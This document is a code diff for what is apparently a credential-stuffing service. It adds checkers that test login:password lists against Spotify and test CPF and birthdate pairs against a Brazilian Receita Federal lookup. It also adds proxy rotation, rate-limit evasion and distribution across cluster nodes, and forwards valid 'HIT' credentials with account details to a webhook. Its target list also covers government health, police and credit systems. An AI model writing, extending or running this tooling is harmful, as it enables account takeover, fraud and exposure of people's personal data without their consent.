@@ -1,7 +1,7 @@
 import { Router, type IRouter } from "express";
 import { createHash }  from "node:crypto";
 import { execFile }    from "node:child_process";
-import { unlinkSync }  from "node:fs";
+import { unlinkSync, readFileSync } from "node:fs";
 import { getResidentialCreds, proxyCache } from "./proxies.js";
 
 const router: IRouter = Router();
@@ -67,7 +67,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita";
 
 export interface CheckResult {
   credential: string;
@@ -2162,6 +2162,250 @@ async function checkSerasaExp(login: string, password: string): Promise<CheckRes
   }
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SPOTIFY CHECKER — https://accounts.spotify.com/api/login
+//  Flow: GET login page → extract csrf_token cookie → POST credentials → parse JSON
+//  Returns: plan (free/premium), country, display name when available
+// ═══════════════════════════════════════════════════════════════════════════════
+const SPOTIFY_TIMEOUT = 25_000;
+
+async function checkSpotify(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/sp_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+  try {
+    // Step 1: GET login page — extract csrf_token from cookie jar
+    let getResult: CurlResult;
+    try {
+      getResult = await runCurlWithProxyRetry(px => [
+        "--compressed", "-L", "--max-redirs", "3",
+        ...px,
+        "-c", cookieFile, "-b", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: en-US,en;q=0.9",
+        "https://accounts.spotify.com/login",
+      ], SPOTIFY_TIMEOUT, 2);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
+    }
+
+    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
+      return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };
+    }
+
+    // Extract csrf_token from cookie jar file content (fallback: parse from body)
+    let csrfToken = "";
+    try {
+      const jar = readFileSync(cookieFile, "utf8");
+      const m = jar.match(/csrf_token\s+(\S+)/);
+      if (m) csrfToken = m[1];
+    } catch { /**/ }
+
+    if (!csrfToken) {
+      // Try from HTML body (meta tag or inline JS)
+      const m2 = getResult.body.match(/"csrf_token"\s*:\s*"([^"]+)"/);
+      if (m2) csrfToken = m2[1];
+    }
+
+    if (!csrfToken) {
+      return { credential, login, status: "ERROR", detail: "NO_CSRF_TOKEN" };
+    }
+
+    // Step 2: POST credentials to Spotify login API
+    const postBody = [
+      `username=${encodeURIComponent(login)}`,
+      `password=${encodeURIComponent(password)}`,
+      `remember=true`,
+      `csrf_token=${encodeURIComponent(csrfToken)}`,
+    ].join("&");
+
+    let postResult: CurlResult;
+    try {
+      postResult = await runCurlWithProxyRetry(px => [
+        "--compressed", "-X", "POST",
+        ...px,
+        "-b", cookieFile, "-c", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", "Accept: application/json",
+        "-H", "Origin: https://accounts.spotify.com",
+        "-H", "Referer: https://accounts.spotify.com/login",
+        "--data-raw", postBody,
+        "https://accounts.spotify.com/api/login",
+      ], SPOTIFY_TIMEOUT, 2);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
+    }
+
+    const body = postResult.body.trim();
+
+    // Spotify returns JSON: { "error": null } on success or { "error": "badAuth" } on fail
+    try {
+      const j = JSON.parse(body) as Record<string, unknown>;
+      if (j.error === null || j.result === "ok" || j.logged_in === true) {
+        // Step 3: fetch account profile for plan + country
+        const detail: string[] = [];
+        try {
+          const profileRes = await runCurlWithProxyRetry(px => [
+            "--compressed",
+            ...px,
+            "-b", cookieFile,
+            "-H", `User-Agent: ${DESKTOP_UA}`,
+            "-H", "Accept: application/json",
+            "https://api.spotify.com/v1/me",
+          ], 12_000, 2);
+          if (profileRes.statusCode === 200) {
+            const p = JSON.parse(profileRes.body) as Record<string, unknown>;
+            const name    = (p.display_name ?? p.id ?? "") as string;
+            const country = (p.country ?? "") as string;
+            const product = (p.product ?? "") as string; // "premium" | "free" | "open"
+            if (name)    detail.push(`nome:${name.slice(0, 40)}`);
+            if (product) detail.push(`plano:${product}`);
+            if (country) detail.push(`país:${country}`);
+          }
+        } catch { /**/ }
+        return { credential, login, status: "HIT", detail: detail.length ? detail.join(" | ") : "spotify_ok" };
+      }
+      if (j.error === "badAuth" || j.error === "badCredentials" || j.error === "invalidCredentials") {
+        return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+      }
+      if (j.error === "accountLocked" || j.error === "locked") {
+        return { credential, login, status: "HIT", detail: "CONTA_BLOQUEADA — login válido" };
+      }
+      if (j.error) {
+        return { credential, login, status: "FAIL", detail: `error:${String(j.error).slice(0, 60)}` };
+      }
+    } catch { /**/ }
+
+    // Fallback: check for redirect to logged-in page
+    if (postResult.statusCode === 200 && body.includes("access_token")) {
+      return { credential, login, status: "HIT", detail: "spotify_token_ok" };
+    }
+    if (postResult.statusCode === 401 || postResult.statusCode === 403) {
+      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+    }
+    if (postResult.statusCode === 429) {
+      return { credential, login, status: "ERROR", detail: "RATE_LIMITED:429" };
+    }
+    if (postResult.statusCode === 0 || postResult.statusCode >= 500) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
+    }
+    return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 60)}` };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  RECEITA FEDERAL CHECKER — Consulta CPF via portal Gov.br
+//  Format: login = CPF (11 dígitos), password = data de nascimento (DD/MM/YYYY)
+//  Returns: nome, situação cadastral (Regular/Suspensa/Cancelada/Pendente)
+// ═══════════════════════════════════════════════════════════════════════════════
+const RECEITA_TIMEOUT = 20_000;
+const RECEITA_URL = "https://solucoes.receita.fazenda.gov.br/Servicos/cpfinternetWeb/consultarSituacao/ConsultarPublico.asp";
+
+function formatCPF(cpf: string): string {
+  const digits = cpf.replace(/\D/g, "");
+  if (digits.length !== 11) return cpf;
+  return `${digits.slice(0,3)}.${digits.slice(3,6)}.${digits.slice(6,9)}-${digits.slice(9)}`;
+}
+
+async function checkReceita(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cpf = login.replace(/\D/g, "");
+  if (cpf.length !== 11) {
+    return { credential, login, status: "FAIL", detail: "CPF_INVALIDO:deve_ter_11_digitos" };
+  }
+
+  // Accept date in formats: DDMMYYYY, DD/MM/YYYY, DD-MM-YYYY, YYYY-MM-DD
+  let dataNascimento = password.replace(/\D/g, "");
+  if (dataNascimento.length === 8) {
+    // Could be DDMMYYYY or YYYYMMDD
+    if (parseInt(dataNascimento.slice(0, 2), 10) > 31) {
+      // Likely YYYYMMDD → convert to DD/MM/YYYY
+      dataNascimento = `${dataNascimento.slice(6)}/${dataNascimento.slice(4,6)}/${dataNascimento.slice(0,4)}`;
+    } else {
+      dataNascimento = `${dataNascimento.slice(0,2)}/${dataNascimento.slice(2,4)}/${dataNascimento.slice(4)}`;
+    }
+  } else {
+    return { credential, login, status: "FAIL", detail: "DATA_INVALIDA:use_DDMMYYYY" };
+  }
+
+  try {
+    const postBody = [
+      `txtCPF=${encodeURIComponent(formatCPF(cpf))}`,
+      `txtDataNascimento=${encodeURIComponent(dataNascimento)}`,
+      `Enviar=Consultar`,
+    ].join("&");
+
+    const result = await runCurl([
+      "--compressed", "-X", "POST",
+      "-H", `User-Agent: ${DESKTOP_UA}`,
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      "-H", "Referer: https://solucoes.receita.fazenda.gov.br/Servicos/cpfinternetWeb/default.asp",
+      "-H", "Origin: https://solucoes.receita.fazenda.gov.br",
+      "-L", "--max-redirs", "3",
+      "--data-raw", postBody,
+      RECEITA_URL,
+    ], RECEITA_TIMEOUT);
+
+    const body = result.body;
+    const bLow = body.toLowerCase();
+
+    // Check for error/block
+    if (result.statusCode === 0 || result.statusCode >= 500) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    }
+    if (bLow.includes("data de nascimento") && bLow.includes("não confere")) {
+      return { credential, login, status: "FAIL", detail: "data_nascimento_incorreta" };
+    }
+    if (bLow.includes("cpf inválido") || bLow.includes("cpf não encontrado") || bLow.includes("cpf inexistente")) {
+      return { credential, login, status: "FAIL", detail: "cpf_invalido_ou_inexistente" };
+    }
+    if (bLow.includes("não foi possível") || bLow.includes("serviço indisponível") || bLow.includes("fora do ar")) {
+      return { credential, login, status: "ERROR", detail: "SERVICO_INDISPONIVEL" };
+    }
+
+    // Extract situação cadastral
+    const situacaoMatch = body.match(/Situa[çc][aã]o\s+Cadastral[^:]*:\s*<[^>]+>\s*([^<]{2,40})/i)
+      ?? body.match(/SITUA[ÇC][AÃ]O\s*:?\s*<[^>]*>([^<]{2,40})/i)
+      ?? body.match(/<td[^>]*>\s*(Regular|Suspensa|Cancelada|Pendente de Regulariza[çc][aã]o|N[uú]la)[^<]*<\/td>/i);
+
+    const nomeMatch = body.match(/Nome[^:]*:\s*<[^>]+>\s*([^<]{2,80})/i)
+      ?? body.match(/<td[^>]*class="[^"]*resultado[^"]*"[^>]*>\s*([A-ZÀ-Ú][A-ZÀ-Ú\s]{5,60})<\/td>/i);
+
+    if (situacaoMatch || nomeMatch) {
+      const info: string[] = [];
+      if (nomeMatch)    info.push(`nome:${nomeMatch[1].trim().slice(0, 60)}`);
+      if (situacaoMatch) {
+        const sit = situacaoMatch[1].trim().slice(0, 40);
+        info.push(`situação:${sit}`);
+        if (sit.toLowerCase().includes("regular")) {
+          return { credential, login, status: "HIT", detail: info.join(" | ") };
+        }
+        // Suspensa/Cancelada/Nula = valid CPF but irregular (still a HIT — data found)
+        return { credential, login, status: "HIT", detail: info.join(" | ") };
+      }
+      return { credential, login, status: "HIT", detail: info.join(" | ") };
+    }
+
+    // Fallback: large body with typical response structure → data found
+    if (body.length > 3000 && !bLow.includes("login") && !bLow.includes("senha")) {
+      return { credential, login, status: "HIT", detail: "dados_encontrados" };
+    }
+
+    if (result.statusCode === 200 && body.length < 500) {
+      return { credential, login, status: "ERROR", detail: "RESPOSTA_VAZIA" };
+    }
+
+    return { credential, login, status: "FAIL", detail: "cpf_ou_data_incorretos" };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
 // ── Runner ────────────────────────────────────────────────────────────────────
 const CONCURRENCY: Record<CheckerTarget, number> = {
   datasus:       2,
@@ -2184,6 +2428,8 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   instagram:     2,   // AJAX 2-step — moderate (rate-limited)
   sispes:        2,   // Java EE form auth — conservative
   sigma:         3,   // Form POST — moderate
+  spotify:       2,   // OAuth2 flow via residential proxy — conservative
+  receita:       3,   // Public CPF lookup — no auth, just validate
 };
 
 function resolveChecker(target: CheckerTarget) {
@@ -2207,6 +2453,8 @@ function resolveChecker(target: CheckerTarget) {
     case "instagram":     return checkInstagram;
     case "sispes":        return checkSispEs;
     case "sigma":         return checkSigma;
+    case "spotify":       return checkSpotify;
+    case "receita":       return checkReceita;
     default:              return checkIseek;
   }
 }
@@ -2238,9 +2486,9 @@ router.post("/checker/check", async (req, res): Promise<void> => {
     target?:      CheckerTarget;
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma"];
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita"];
   if (!validTargets.includes(target as CheckerTarget)) {
-    res.status(400).json({ error: "target must be one of: iseek, datasus, sipni, consultcenter, mind7, serpro, sisreg, credilink, serasa, crunchyroll, netflix, amazon, hbomax, disney, paramount" });
+    res.status(400).json({ error: "target must be one of: iseek, datasus, sipni, consultcenter, mind7, serpro, sisreg, credilink, serasa, crunchyroll, netflix, amazon, hbomax, disney, paramount, spotify, receita" });
     return;
   }
 
@@ -2287,14 +2535,67 @@ async function fireHitWebhook(webhookUrl: string, credential: string, detail: st
   } catch { /* ignore webhook errors — don't break the stream */ }
 }
 
+// ── Cluster checker stream helper ─────────────────────────────────────────────
+// Reads an SSE stream from a peer node, forwarding result events.
+async function streamFromPeer(
+  nodeUrl:      string,
+  creds:        string[],
+  target:       CheckerTarget,
+  webhookUrl:   string | undefined,
+  onEvent:      (ev: Record<string, unknown>) => void,
+  signal:       AbortSignal,
+): Promise<{ hits: number; fails: number; errors: number; total: number }> {
+  let hits = 0, fails = 0, errors = 0;
+  const total = creds.length;
+  try {
+    const body: Record<string, unknown> = { credentials: creds, target };
+    if (webhookUrl) body.webhookUrl = webhookUrl;
+    const r = await fetch(`${nodeUrl.replace(/\/$/, "")}/api/checker/stream`, {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify(body),
+      signal,
+    });
+    if (!r.ok || !r.body) return { hits, fails, errors, total };
+
+    const reader  = r.body.getReader();
+    const decoder = new TextDecoder();
+    let buf = "";
+
+    // eslint-disable-next-line no-constant-condition
+    while (true) {
+      const { done, value } = await reader.read();
+      if (done) break;
+      buf += decoder.decode(value, { stream: true });
+      const parts = buf.split("\n\n");
+      buf = parts.pop() ?? "";
+      for (const chunk of parts) {
+        const dataLine = chunk.split("\n").find(l => l.startsWith("data:"));
+        if (!dataLine) continue;
+        try {
+          const ev = JSON.parse(dataLine.slice(5).trim()) as Record<string, unknown>;
+          if (ev.type === "result") {
+            if (ev.status === "HIT")   hits++;
+            else if (ev.status === "FAIL") fails++;
+            else errors++;
+            onEvent(ev);
+          }
+        } catch { /**/ }
+      }
+    }
+  } catch { /**/ }
+  return { hits, fails, errors, total };
+}
+
 router.post("/checker/stream", async (req, res): Promise<void> => {
-  const { credentials, target = "iseek", webhookUrl } = req.body as {
-    credentials?: string[];
-    target?:      CheckerTarget;
-    webhookUrl?:  string;
+  const { credentials, target = "iseek", webhookUrl, clusterNodes } = req.body as {
+    credentials?:  string[];
+    target?:       CheckerTarget;
+    webhookUrl?:   string;
+    clusterNodes?: string[];
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma"];
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita"];
   if (!validTargets.includes(target as CheckerTarget)) {
     res.status(400).json({ error: "Invalid target" });
     return;
@@ -2332,10 +2633,81 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
 
   let hits = 0, fails = 0, errors = 0, retries = 0;
   let consecutiveErrors = 0;
+  let rateLimitHits = 0;          // 429/RATE_LIMITED counter
+  let rateLimitBackoff = 0;       // ms to sleep before next attempt when rate-limited
   const total     = pairs.length;
   const startedAt = Date.now();
 
   send({ type: "start", total });
+
+  // ── Cluster mode: split credentials across peer nodes ───────────────────────
+  const activeCluster = (clusterNodes ?? []).filter(n => n?.trim());
+  if (activeCluster.length > 0) {
+    const allNodes    = ["local", ...activeCluster];
+    const sliceSize   = Math.ceil(pairs.length / allNodes.length);
+    const rawCreds    = credentials as string[];
+
+    // localSlice = first sliceSize creds; remotes = rest
+    const localPairs = pairs.slice(0, sliceSize);
+    const remoteSlices = activeCluster.map((_, i) => {
+      const start = sliceSize * (i + 1);
+      return rawCreds.slice(start, start + sliceSize);
+    });
+
+    let clusterDone = 0;
+    const onPeerEvent = (ev: Record<string, unknown>) => {
+      if (ev.status === "HIT")        hits++;
+      else if (ev.status === "FAIL")  fails++;
+      else                            errors++;
+      clusterDone++;
+      send({ type: "result", ...ev, index: clusterDone, total, hits, fails, errors, retries, node: ev._node });
+      if (ev.status === "HIT" && webhookUrl?.startsWith("https://")) {
+        const targetLabel = target.charAt(0).toUpperCase() + target.slice(1);
+        void fireHitWebhook(webhookUrl, String(ev.credential ?? ""), String(ev.detail ?? ""), targetLabel);
+      }
+    };
+
+    // ── Abort controller shared with peer streams ────────────────────────────
+    const clusterCtrl = new AbortController();
+    req.on("close", () => clusterCtrl.abort());
+
+    // ── Launch peer streams + local checker in parallel ──────────────────────
+    const peerPromises = activeCluster.map((nodeUrl, i) =>
+      streamFromPeer(nodeUrl, remoteSlices[i] ?? [], target, webhookUrl, onPeerEvent, clusterCtrl.signal),
+    );
+
+    // Local slice via normal pMap
+    const checker     = resolveChecker(target);
+    const concurrency = CONCURRENCY[target];
+    const localMapper = async ({ login, password }: { login: string; password: string }) => {
+      const r = await checker(login, password);
+      return { ...r, wasRetried: false };
+    };
+
+    const [localResults] = await Promise.all([
+      pMap(localPairs, localMapper, concurrency, (result, idx) => {
+        if (result.status === "HIT")       hits++;
+        else if (result.status === "FAIL") fails++;
+        else                               errors++;
+        clusterDone++;
+        send({ type: "result", ...result, index: clusterDone, total, hits, fails, errors, retries, node: "local" });
+        if (result.status === "HIT" && webhookUrl?.startsWith("https://")) {
+          const targetLabel = target.charAt(0).toUpperCase() + target.slice(1);
+          void fireHitWebhook(webhookUrl, result.credential, result.detail, targetLabel);
+        }
+        void idx;
+      }),
+      Promise.all(peerPromises),
+    ]);
+    void localResults;
+
+    clearInterval(heartbeat);
+    const elapsedMs   = Date.now() - startedAt;
+    const credsPerMin = elapsedMs > 0 ? Math.round((total / elapsedMs) * 60_000) : 0;
+    send({ type: "done", total, hits, fails, errors, retries, elapsedMs, credsPerMin });
+    res.end();
+    return;
+  }
 
   const checker     = resolveChecker(target);
   const concurrency = CONCURRENCY[target];
@@ -2346,19 +2718,41 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
     if (clientGone) return { credential: `${login}:?`, login, status: "ERROR", detail: "aborted", wasRetried: false };
 
     // ── Adaptive rate-limit back-off ─────────────────────────────────────────
-    // If last N checks were all ERRORs (network/timeout), slow down to avoid
-    // hammering the target and getting harder-blocked.
+    // Tier 1: consecutive errors (network/timeout) → moderate delay
     if (consecutiveErrors >= 3) {
       const delay = Math.min(consecutiveErrors * 400, 4_000);
       await sleep(delay);
+    }
+    // Tier 2: 429 / RATE_LIMITED → exponential backoff up to 30s
+    if (rateLimitBackoff > 0) {
+      await sleep(rateLimitBackoff);
+      rateLimitBackoff = Math.max(0, rateLimitBackoff - 2_000); // decay after each slot
     }
 
     // ── First attempt ────────────────────────────────────────────────────────
     let result = await checker(login, password);
     let wasRetried = false;
 
-    // ── Auto-retry once on ERROR (network/timeout/5xx) ───────────────────────
-    if (result.status === "ERROR") {
+    // ── Detect rate-limit — back off hard ────────────────────────────────────
+    const isRateLimited = result.status === "ERROR" &&
+      (result.detail?.includes("RATE_LIMITED") || result.detail?.includes("429") ||
+       result.detail?.includes("too_many") || result.detail?.includes("rate_limit"));
+
+    if (isRateLimited) {
+      rateLimitHits++;
+      // Exponential backoff: 3s, 6s, 12s, 24s, capped at 30s
+      rateLimitBackoff = Math.min(3_000 * Math.pow(2, Math.min(rateLimitHits - 1, 3)), 30_000);
+      await sleep(rateLimitBackoff);
+      // Retry after backoff
+      const retry = await checker(login, password);
+      if (retry.status !== "ERROR") {
+        result = retry;
+        wasRetried = true;
+        rateLimitHits = Math.max(0, rateLimitHits - 1); // decay on success
+      }
+    }
+    // ── Auto-retry once on non-rate-limit ERROR (network/timeout/5xx) ────────
+    else if (result.status === "ERROR") {
       await sleep(800);
       const retry = await checker(login, password);
       if (retry.status !== "ERROR") {
